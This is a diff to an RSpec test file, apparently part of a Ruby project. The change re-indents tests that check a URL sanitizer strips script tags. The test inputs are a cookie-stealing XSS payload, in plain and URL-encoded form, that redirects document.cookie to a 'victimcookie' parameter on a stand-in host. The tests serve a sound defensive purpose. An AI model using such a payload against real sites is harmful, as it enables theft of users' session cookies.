@@ -77,20 +77,21 @@ RSpec.describe Sanitizer, type: :service do
 
       it "removes tags that are not encoded" do
         xss = "http://localhost/weak-site/search?keyword=<script>window.location="\
-          "'http://localhost/?victimcookie='+document.cookie</script>"
+              "'http://localhost/?victimcookie='+document.cookie</script>"
 
         clean_url = Sanitizer.sanitize_url(xss)
 
         expect(CGI.unescape(clean_url)).to eq "http://localhost/weak-site/search?keyword=window.location="\
-          "'http://localhost/?victimcookie=' document.cookie"
+                                              "'http://localhost/?victimcookie=' document.cookie"
       end
 
       it "removes tags that are encoded" do
         xss = "http%3A%2F%2Flocalhost%2Fweak-site%2Fsearch%3Fkeyword%3D%3Cscript%3Ewindow."\
-          "location%3D%27http%3A%2F%2Flocalhost%2F%3Fvictimcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
+              "location%3D%27http%3A%2F%2Flocalhost%2F%3Fvictimcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
 
         expect(Sanitizer.sanitize_url(xss)).to eq "http://localhost/weak-site/search?keyword%3Dwindow."\
-          "location%3D%27http%3A%2F%2Flocalhost%2F%3Fvictimcookie%3D%27+document.cookie"
+                                                  "location%3D%27http%3A%2F%2Flocalhost%2F%3Fvictimcookie%3D%27+"\
+                                                  "document.cookie"
       end
     end
   end
